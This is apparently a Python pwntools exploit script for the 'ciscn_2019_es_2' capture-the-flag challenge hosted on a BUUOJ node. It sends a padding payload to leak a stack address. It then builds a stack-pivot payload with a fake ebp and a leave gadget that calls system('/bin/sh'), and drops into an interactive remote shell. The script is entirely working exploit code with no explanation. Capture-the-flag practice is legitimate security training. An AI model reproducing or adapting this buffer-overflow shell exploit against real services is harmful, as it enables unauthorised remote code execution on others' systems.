#! /usr/bin/python


from pwn import *
from LibcSearcher import *

p = remote('node3.buuoj.cn',26117)
#p = process('./ciscn_2019_es_2')
elf = ELF('./ciscn_2019_es_2')

offset = 0x28
leave = 0x80485FD
puts_got = elf.got['puts']
puts_plt = elf.symbols['puts']

payload = 'A' * (offset - 0x8)
p.sendline(payload)
buf = u32(p.recvuntil('\xff')[-4:].ljust(4,'\x00')) - 228

system = elf.symbols['system']
fake_ebp = buf - 4
payload = p32(system) + 'dead' + p32(buf + 0x4*3) + '/bin/sh\x00'
payload = payload.ljust(offset,'A')#forward to ebp
payload+= p32(fake_ebp) + p32(leave)
p.sendline(payload)

p.interactive()
